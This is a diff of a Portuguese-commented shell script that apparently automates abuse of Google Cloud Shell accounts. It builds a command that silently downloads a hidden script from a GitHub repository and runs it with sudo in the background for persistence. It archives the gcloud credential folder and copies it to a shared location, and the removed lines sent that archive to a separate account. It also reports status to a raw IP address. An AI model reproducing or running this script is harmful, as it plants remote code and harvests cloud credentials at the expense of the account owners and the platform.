@@ -6,8 +6,6 @@ echo $1
 #Define nome do arquivo de backup
 file='backup_'$(date +"%d%m%Y%H%M%S")'.zip'
 
-backup_account='backup.gcloud1@gmail.com'
-
 #Comando que será executado no gcloud SSH
 command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
 
@@ -35,14 +33,8 @@ zip -r -q ~/$file /root/.config/gcloud/
 #Copia arquivo para pasta compartilhada
 cp ~/$file /mnt/share
 
-#gcloud SSH para publicar chave
-gcloud cloud-shell ssh --account=$backup_account --command="echo 'chave ssh backup ok'" --authorize-session --force-key-file-overwrite --quiet
-
-#Envia para conta gcloud de backup
-gcloud cloud-shell scp localhost:/root/$file cloudshell:~/.backup --account=$backup_account --force-key-file-overwrite
-
 #Altera o status na tbl_account para CREATED
-url='http://135.148.11.148/send_status.php?account='$1'&status=CREATED&owner=ROOT'
+url='http://51.81.101.99/send_status.php?account='$1'&status=CREATED&owner=ROOT'
 curl $url
 
 #Apaga arquivo
